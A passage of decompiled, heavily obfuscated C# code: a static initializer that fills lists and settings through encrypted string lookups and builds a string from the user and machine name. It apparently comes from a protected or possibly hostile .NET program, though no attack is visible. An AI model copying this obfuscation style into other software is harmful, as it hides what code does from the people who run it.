			fZQJZGRivPka(getString_0(107382311)),
			fZQJZGRivPka(getString_0(107388196)),
			fZQJZGRivPka(getString_0(107382206)),
			fZQJZGRivPka(getString_0(107382209)),
			fZQJZGRivPka(getString_0(107382176)),
			fZQJZGRivPka(getString_0(107381591)),
			fZQJZGRivPka(getString_0(107381562)),
			fZQJZGRivPka(getString_0(107388814)),
			fZQJZGRivPka(getString_0(107381521)),
			fZQJZGRivPka(getString_0(107381504)),
			fZQJZGRivPka(getString_0(107381475)),
			fZQJZGRivPka(getString_0(107386537)),
			fZQJZGRivPka(getString_0(107381442)),
			fZQJZGRivPka(getString_0(107381475)),
			fZQJZGRivPka(getString_0(107381413)),
			fZQJZGRivPka(getString_0(107381384)),
			fZQJZGRivPka(getString_0(107381867)),
			fZQJZGRivPka(getString_0(107381786)),
			fZQJZGRivPka(getString_0(107381769)),
			fZQJZGRivPka(getString_0(107381728)),
			fZQJZGRivPka(getString_0(107381667)),
			fZQJZGRivPka(getString_0(107381638)),
			fZQJZGRivPka(getString_0(107381053)),
			fZQJZGRivPka(getString_0(107381008)),
			fZQJZGRivPka(getString_0(107380995)),
			fZQJZGRivPka(getString_0(107380962)),
			fZQJZGRivPka(getString_0(107380905)),
			fZQJZGRivPka(getString_0(107381340)),
			fZQJZGRivPka(getString_0(107381315)),
			fZQJZGRivPka(getString_0(107381282)),
			fZQJZGRivPka(getString_0(107381209)),
			fZQJZGRivPka(getString_0(107381180)),
			fZQJZGRivPka(getString_0(107381151)),
			fZQJZGRivPka(getString_0(107413342)),
			fZQJZGRivPka(getString_0(107413317)),
			fZQJZGRivPka(getString_0(107413244)),
			fZQJZGRivPka(getString_0(107413227)),
			fZQJZGRivPka(getString_0(107413194)),
			fZQJZGRivPka(getString_0(107413113)),
			fZQJZGRivPka(getString_0(107413612)),
			fZQJZGRivPka(getString_0(107413531)),
			fZQJZGRivPka(getString_0(107413518)),
			fZQJZGRivPka(getString_0(107413437)),
			fZQJZGRivPka(getString_0(107413404)),
			fZQJZGRivPka(getString_0(107413363)),
			fZQJZGRivPka(getString_0(107412842)),
			fZQJZGRivPka(getString_0(107412765)),
			fZQJZGRivPka(getString_0(107383766)),
			fZQJZGRivPka(getString_0(107412732)),
			fZQJZGRivPka(getString_0(107412691)),
			fZQJZGRivPka(getString_0(107412634)),
			fZQJZGRivPka(getString_0(107412605)),
			fZQJZGRivPka(getString_0(107413084)),
			fZQJZGRivPka(getString_0(107413051)),
			fZQJZGRivPka(getString_0(107413034)),
			fZQJZGRivPka(getString_0(107413005)),
			fZQJZGRivPka(getString_0(107412960)),
			fZQJZGRivPka(getString_0(107412883)),
			fZQJZGRivPka(getString_0(107412874)),
			fZQJZGRivPka(getString_0(107412273)),
			fZQJZGRivPka(getString_0(107412256)),
			fZQJZGRivPka(getString_0(107412227)),
			fZQJZGRivPka(getString_0(107412150))
		};
		RYQEJChRDfRniT = new List<string>
		{
			fZQJZGRivPka(getString_0(107412141)),
			fZQJZGRivPka(getString_0(107412572)),
			fZQJZGRivPka(getString_0(107412555)),
			fZQJZGRivPka(getString_0(107412474)),
			fZQJZGRivPka(getString_0(107412457)),
			fZQJZGRivPka(getString_0(107412392)),
			fZQJZGRivPka(getString_0(107411771)),
			fZQJZGRivPka(getString_0(107411710))
		};
		IYyHyFnceXw = new List<string>
		{
			fZQJZGRivPka(getString_0(107411685)),
			fZQJZGRivPka(getString_0(107411652)),
			fZQJZGRivPka(getString_0(107411575)),
			fZQJZGRivPka(getString_0(107412070)),
			fZQJZGRivPka(getString_0(107412037)),
			fZQJZGRivPka(getString_0(107411956)),
			fZQJZGRivPka(getString_0(107411943)),
			fZQJZGRivPka(getString_0(107411910)),
			fZQJZGRivPka(getString_0(107411877)),
			fZQJZGRivPka(getString_0(107411844)),
			fZQJZGRivPka(getString_0(107411299)),
			fZQJZGRivPka(getString_0(107411266)),
			fZQJZGRivPka(getString_0(107411193)),
			fZQJZGRivPka(getString_0(107411152)),
			fZQJZGRivPka(getString_0(107411139)),
			fZQJZGRivPka(getString_0(107411106)),
			fZQJZGRivPka(getString_0(107411545)),
			fZQJZGRivPka(getString_0(107411512)),
			fZQJZGRivPka(getString_0(107411471)),
			fZQJZGRivPka(getString_0(107411462)),
			fZQJZGRivPka(getString_0(107411429)),
			fZQJZGRivPka(getString_0(107411356)),
			fZQJZGRivPka(getString_0(107411323)),
			fZQJZGRivPka(getString_0(107411685)),
			fZQJZGRivPka(getString_0(107410770)),
			fZQJZGRivPka(getString_0(107410761)),
			fZQJZGRivPka(getString_0(107410684)),
			fZQJZGRivPka(getString_0(107410651)),
			fZQJZGRivPka(getString_0(107410610)),
			fZQJZGRivPka(getString_0(107410601)),
			fZQJZGRivPka(getString_0(107410568)),
			fZQJZGRivPka(getString_0(107411039)),
			fZQJZGRivPka(getString_0(107410966)),
			fZQJZGRivPka(getString_0(107411652)),
			fZQJZGRivPka(getString_0(107410957)),
			fZQJZGRivPka(getString_0(107411575)),
			fZQJZGRivPka(getString_0(107410924)),
			fZQJZGRivPka(getString_0(107410891)),
			fZQJZGRivPka(getString_0(107410850)),
			fZQJZGRivPka(getString_0(107410817)),
			fZQJZGRivPka(getString_0(107410232)),
			fZQJZGRivPka(getString_0(107410191)),
			fZQJZGRivPka(getString_0(107410190)),
			fZQJZGRivPka(getString_0(107410157)),
			fZQJZGRivPka(getString_0(107410116)),
			fZQJZGRivPka(getString_0(107410043)),
			fZQJZGRivPka(getString_0(107410514))
		};
		mHHmssBZBWOZ = new List<string>
		{
			fZQJZGRivPka(CiGbFuBASDry(getString_0(107410505))),
			fZQJZGRivPka(getString_0(107410424)),
			fZQJZGRivPka(getString_0(107410331)),
			fZQJZGRivPka(getString_0(107409722)),
			fZQJZGRivPka(getString_0(107409629)),
			fZQJZGRivPka(getString_0(107409532)),
			fZQJZGRivPka(getString_0(107409983)),
			fZQJZGRivPka(getString_0(107409854)),
			fZQJZGRivPka(getString_0(107409793)),
			fZQJZGRivPka(getString_0(107409184)),
			fZQJZGRivPka(getString_0(107409091)),
			fZQJZGRivPka(getString_0(107409506)),
			fZQJZGRivPka(getString_0(107409413)),
			fZQJZGRivPka(CiGbFuBASDry(getString_0(107410505)))
		};
		rtAqVHFswBwj = fZQJZGRivPka(getString_0(107409316));
		BmlqsqzWSp = new List<string>
		{
			fZQJZGRivPka(getString_0(107408659)),
			fZQJZGRivPka(getString_0(107408977)),
			fZQJZGRivPka(getString_0(107408783)),
			fZQJZGRivPka(getString_0(107408109)),
			fZQJZGRivPka(getString_0(107408427)),
			fZQJZGRivPka(getString_0(107407721))
		};
		phIVwPSoCuYf = new List<string>
		{
			fZQJZGRivPka(getString_0(107407527)),
			fZQJZGRivPka(getString_0(107407978)),
			fZQJZGRivPka(getString_0(107407917))
		};
		IvhuCXWwZumGPb = getString_0(107396728);
		hmHVGpHMkL = getString_0(107396728);
		SuSdzNJyyA = new DateTime(2000, 1, 1);
		tBAHkTTjaqbd = new DateTime(2100, 1, 1);
		NXdoiZyiNrteeIx = getString_0(107396723);
		dgOdFMVpedl = getString_0(107389791);
		ciHqTVbhEVV = getString_0(107396728);
		yZYikXqGFNz = getString_0(107396728);
		SDAcXCHWUvTN = getString_0(107396728);
		GpNvmEbLoW = getString_0(107396723);
		NdkBdhvmkUBFR = getString_0(107396728);
		RcvnDaFPNx = getString_0(107396728);
		zKXWFFBSYfij = new List<string>
		{
			getString_0(107395738),
			getString_0(107395964),
			getString_0(107395772),
			getString_0(107395365)
		};
		ZfHomqQTuOmtb = getString_0(107396728);
		izlGYUEMadkw = getString_0(107407824);
		IHVTjtEZmOq = getString_0(107396728);
		mZaewZqNNWRle = getString_0(107396728);
		KzDKAwpEDBDhbZ = getString_0(107396728);
		MsZHKpPUIB = string.Empty;
		UyIztOAKEezWP = getString_0(107396728);
		PHCDdlXNXITu = getString_0(107396723);
		XnbJtBigjAr = getString_0(107396723);
		cIwOYeNPGIS = getString_0(107407851);
		FlfcMNWtWJT = getString_0(107407786);
		hICvTAbwOH = getString_0(107396728);
		qiAyCZrkcfxPCy = getString_0(107396728);
		oHvnHZNAsYHPnYh = getString_0(107396723);
		PlWUGyhfSqfH = getString_0(107396728);
		nEPaoSCDDJIu = getString_0(107396728);
		XhJHLJrVZaJK = getString_0(107392908);
		QNfiyxlqnyQSHfAtq = getString_0(107396728);
		QTMFjMGUSzJtndnPr = getString_0(107396728);
		ynsSldAgNPTL = getString_0(107407161);
		bmLbSmUKQBkE = getString_0(107396728);
		AzCwVUHADRyQl = getString_0(107396728);
		XKThLpoClXsvWc = getString_0(107396728);
		DalbLBzSpkO = getString_0(107396728);
		nHbzLHWNkTpdce = getString_0(107407172);
		tPCQnXbcSTT = getString_0(107396723);
		tvydoMeQddnwLfE = getString_0(107396728);
		MjNpYfbjnEDi = getString_0(107396728);
		UPPaZPQieUNgnnu = getString_0(107396728);
		VaGiOwbIOhAwriX = new string[0];
		RkUaESiNCKRAc = getString_0(107396723);
		gzeLuZIeGEn = true;
		deIFjWqTxmS = getString_0(107396728);
		pWVZjGlhSAv = false;
		epoMZiCIvzDw = false;
		yFqzKQIYBVit = false;
		grHEUQDDHItFXk = false;
		EMMziOGItwvgBn = getString_0(107407127);
		wnBkEuneoGOR = false;
		TbDfMwWVTbJO = false;
		GAIvQZMakR = false;
		UKtytEenHZq = false;
		rTfnyAYcMHFOLjucY = true;
		xWkyqHPGgTDUWV = getString_0(107407138) + Environment.UserName + getString_0(107407093) + Environment.MachineName + getString_0(107407104) + IoVTZTUGdmDX.lOkUlDnVqGkweRha() + getString_0(107407067);
		HWttnJXULiJ = false;
		wwZjPqxjlvFwy = new Stopwatch();
		OGYcpcFLVvGwO = 0;
		GkQZQPTFEnIO = 0;
		PqrzhfLlmsnd = true;
		mpATdrWCpkge = getString_0(107407058) + IoVTZTUGdmDX.lOkUlDnVqGkweRha() + getString_0(107407081);
		ovnWSoWGUtwXV = new string[1] { getString_0(107407076) };
		CyGCgzMZZuAJtJpyo = new List<string>();
		nGueWKGoROlbJ = 200;
	}
}
